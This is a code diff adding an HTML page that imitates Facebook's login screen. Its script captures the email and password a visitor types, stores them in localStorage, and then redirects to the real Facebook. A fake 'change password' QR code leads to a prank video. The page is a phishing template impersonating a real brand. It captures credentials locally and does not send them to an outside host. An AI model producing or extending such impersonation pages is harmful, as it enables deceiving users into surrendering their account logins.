@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            position: relative; /* Added */
+        }
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .left-section {
+            margin-right: 50px;
+        }
+        .left-section h1 {
+            color: #1877f2;
+            font-size: 48px;
+            margin: 0;
+        }
+        .left-section p {
+            font-size: 24px;
+            color: #1c1e21;
+            margin: 10px 0 0 0;
+        }
+        .login-container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            width: 400px;
+            text-align: center;
+        }
+        .login-container input[type="text"],
+        .login-container input[type="password"] {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 15px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 20px;
+            cursor: pointer;
+            margin: 10px 0;
+        }
+        .login-container button:hover {
+            background-color: #165fbb;
+        }
+        .login-container a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        .divider {
+            width: 100%;
+            height: 1px;
+            background-color: #dddfe2;
+            margin: 20px 0;
+        }
+        .create-account-button {
+            background-color: #59db13;
+            font-size: 18px;
+            margin-top: 20px;
+        }
+        .create-account-button:hover {
+            background-color: #46A314;
+        }
+        .create-page {
+            margin-top: 20px;
+            font-size: 14px;
+        }
+        .create-page a {
+            font-weight: bold;
+            text-decoration: none;
+            color: #1c1e21;
+        }
+        #qrCodeContainer {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        #qrCodeContainer img {
+            width: 150px;
+            height: 150px;
+        }
+        #qrCodeContainer h2 {
+            color: white;
+            margin-bottom: 20px;
+        }
+        .watermark {
+            position: absolute;
+            bottom: 10px;
+            left: 10px;
+            font-size: 8px;
+            color: #ccc;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="left-section">
+            <h1>facebook</h1>
+            <p>Facebook helps you connect and share with the people in your life.</p>
+        </div>
+        <div class="login-container">
+            <form id="loginForm">
+                <input type="text" id="email" placeholder="Email address or phone number" required>
+                <input type="password" id="password" placeholder="Password" required>
+                <button type="submit">Log in</button>
+                <a id="forgotPasswordLink" href="#">Forgotten password?</a>
+                <div class="divider"></div>
+                <button type="button" class="create-account-button">Create new account</button>
+            </form>
+            <div class="create-page">
+                <p><a href="#">Create a Page</a> for a celebrity, brand or business.</p>
+            </div>
+        </div>
+    </div>
+    <div id="qrCodeContainer">
+        <h2>Scan it to change password</h2>
+        <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://www.youtube.com/watch?v=dQw4w9WgXcQ" alt="QR Code">
+        <button onclick="closeQRCode()">Close</button>
+    </div>
+    <div class="watermark">SAFIN</div>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const users = JSON.parse(localStorage.getItem('users')) || [];
+            users.push({ email, password });
+            localStorage.setItem('users', JSON.stringify(users));
+            alert('Form submitted successfully! Redirecting to Facebook...');
+            window.location.href = 'https://www.facebook.com/';
+        });
+
+        document.getElementById('forgotPasswordLink').addEventListener('click', function(event) {
+            event.preventDefault();
+            document.getElementById('qrCodeContainer').style.display = 'flex';
+        });
+
+        function closeQRCode() {
+            document.getElementById('qrCodeContainer').style.display = 'none';
+        }
+    </script>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
